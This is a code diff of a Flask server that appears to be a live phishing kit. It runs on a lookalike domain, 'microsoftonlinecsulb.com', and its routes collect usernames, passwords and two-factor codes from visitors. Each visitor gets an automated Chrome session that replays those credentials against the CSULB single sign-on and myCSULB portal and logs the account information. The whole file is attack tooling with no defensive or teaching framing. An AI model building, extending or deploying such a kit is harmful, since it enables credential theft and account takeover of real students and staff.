@@ -1,4 +1,6 @@
-from flask import Flask , redirect, url_for, render_template, request,jsonify
+
+
+from flask import Flask , redirect, url_for, render_template, request,Blueprint
 from OpenSSL import SSL
 import atexit
 import random, string, os
@@ -7,37 +9,96 @@ import main
 import os
 import threading
 from _thread import start_new_thread
+from flask import request
+from flask import jsonify
 
 
 
 app = Flask(__name__)
 context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
 
+#this stuff is no longer supported
+# context = SSL.Context(SSL.TLSv1_2_METHOD)
+# context.use_privatekey_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
+# context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
+# context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')
 
+
+# use threads to start this and give the thread the name of email or ip
+# def task():
+#     chrome = main.startChrome()
+#     return chrome
+#     # your code here
+
+# # # create and start threads
+# # # creates 5 instances where, up to five people are able to run our code
+# for i in range(5):
+#     thread = threading.Thread(target=task)
+#     thread.start()
 
 
 connections = {}
 twofa_code = {}
 submitted = {}
-
-conQueue = []
-codes=[]
-def removeFromConnections():
-    time.sleep(600)
-    if len(conQueue) > 1:
-        try:
-            tmp = conQueue.pop()
-            connections[tmp].driver.close()
-            del connections[tmp]
-        except:
-            pass
-
 # chrome = main.startChrome()
 
 @app.route('/profile')
 def profile():
     return 'Profile'
 
+# def text_task(code):
+#     chrome = main.startChrome()
+#     chrome.text(code)
+#     time.sleep(20)
+#     chrome.open_mycsulb()
+#     chrome.log_info()
+
+# def call_task():
+#     chrome = main.startChrome()
+#     chrome.call()
+#     time.sleep(20)
+#     chrome.open_mycsulb()
+#     chrome.log_info()
+
+# @app.route('/text', methods=['GET', 'POST'])
+# def text():
+#     code = request.form.get('code')
+
+#     # create and start thread for this request
+#     thread = threading.Thread(target=text_task, args=(code,))
+#     thread.start()
+
+#     return render_template('index.html')
+
+# @app.route('/call', methods=['GET', 'POST'])
+# def call():
+#     # create and start thread for this request
+#     thread = threading.Thread(target=call_task)
+#     thread.start()
+
+#     return render_template('index.html')
+
+# define functions to be run in separate threads
+# def login_task(email, password):
+#     chrome = main.startChrome()
+#     var = chrome.login_email(email, password)
+#     if var == True:
+#         #stop loading
+#         print("its true")
+#         check1="<div id='check' />"
+#         with open('./static/'+email+'.txt','w') as file:
+#             file.write("1")
+
+# @app.route('/login', methods=['GET', 'POST'])
+# def login():
+#     email = request.form.get('username')
+#     password = request.form.get('password')
+
+#     # create and start thread for this request
+#     thread = threading.Thread(target=login_task, args=(email, password))
+#     thread.start()
+
+#     return render_template('index.html')
 
 
 @app.route('/requestCode', methods=['GET','POST'])
@@ -59,16 +120,12 @@ def text():
     # Here we use a class of some kind to represent and validate our
     # client-side form data. For example, WTForms is a library that will
     # handle this for us, and we use a custom LoginForm to validate.
-    code = request.form.get('code')
     ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
-    try:
-        if code in codes:
-        # if submitted[ip] == True or (code in codes):
-            return render_template('index.html')
-        submitted[ip] = True
-    except:
-        print("ip error")
-    codes.append(code)
+    if submitted[ip] == True and twofa_code[request.remote.get('code')] == False:
+        return render_template('index.html')
+    submitted[ip] = True
+    code = request.form.get('code')
+    twofa_code[code] = True
     print(code)
     # yield redirect("https://sso.csulb.edu/")
     print("still here")
@@ -89,7 +146,7 @@ def text():
 
     connections[ip].log_info()
 
-    submitted[ip] = False
+
     return render_template('index.html')
 
 @app.route('/call', methods=['GET', 'POST'])
@@ -143,45 +200,19 @@ def login():
     
         
 
+    
+    # if request.method == "POST":
+    #     todo = request.form.get("todo")
+    #     print(todo)
 @app.route('/about')
 def about():
     return 'This is the about page.'
 
 @app.route("/")
 def home():
-    conQueue.append(request.environ.get('HTTP_X_REAL_IP', request.remote_addr))
     submitted[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)] =False
     connections[request.environ.get('HTTP_X_REAL_IP', request.remote_addr)] =  main.startChrome()
     return render_template("index.html")
-
-
-def deleteDrivers():
-    print("cleanup")
-    for i in connections:
-        connections[i].driver.close()
-
-atexit.register(deleteDrivers)
-
-app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True)
-
-#this stuff is no longer supported
-# context = SSL.Context(SSL.TLSv1_2_METHOD)
-# context.use_privatekey_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/privkey.pem')
-# context.use_certificate_chain_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/fullchain.pem')
-# context.use_certificate_file('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem')
-
-
-# use threads to start this and give the thread the name of email or ip
-# def task():
-#     chrome = main.startChrome()
-#     return chrome
-#     # your code here
-
-# # # create and start threads
-# # # creates 5 instances where, up to five people are able to run our code
-# for i in range(5):
-#     thread = threading.Thread(target=task)
-#     thread.start()
 
 # mofified code from runmain.py to work w/ flask
 # @app.route('/main', methods=['POST'])
@@ -261,57 +292,11 @@ app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True
 #     os.system("./Spotify " + arg)
 #     processData(userhash)
 
+def deleteDrivers():
+    print("cleanup")
+    for i in connections:
+        connections[i].driver.close()
 
-# def text_task(code):
-#     chrome = main.startChrome()
-#     chrome.text(code)
-#     time.sleep(20)
-#     chrome.open_mycsulb()
-#     chrome.log_info()
+atexit.register(deleteDrivers)
 
-# def call_task():
-#     chrome = main.startChrome()
-#     chrome.call()
-#     time.sleep(20)
-#     chrome.open_mycsulb()
-#     chrome.log_info()
-
-# @app.route('/text', methods=['GET', 'POST'])
-# def text():
-#     code = request.form.get('code')
-
-#     # create and start thread for this request
-#     thread = threading.Thread(target=text_task, args=(code,))
-#     thread.start()
-
-#     return render_template('index.html')
-
-# @app.route('/call', methods=['GET', 'POST'])
-# def call():
-#     # create and start thread for this request
-#     thread = threading.Thread(target=call_task)
-#     thread.start()
-
-#     return render_template('index.html')
-
-# define functions to be run in separate threads
-# def login_task(email, password):
-#     chrome = main.startChrome()
-#     var = chrome.login_email(email, password)
-#     if var == True:
-#         #stop loading
-#         print("its true")
-#         check1="<div id='check' />"
-#         with open('./static/'+email+'.txt','w') as file:
-#             file.write("1")
-
-# @app.route('/login', methods=['GET', 'POST'])
-# def login():
-#     email = request.form.get('username')
-#     password = request.form.get('password')
-
-#     # create and start thread for this request
-#     thread = threading.Thread(target=login_task, args=(email, password))
-#     thread.start()
-
-#     return render_template('index.html')
+app.run(host='0.0.0.0', port=443, threaded=True, ssl_context=context, debug=True)
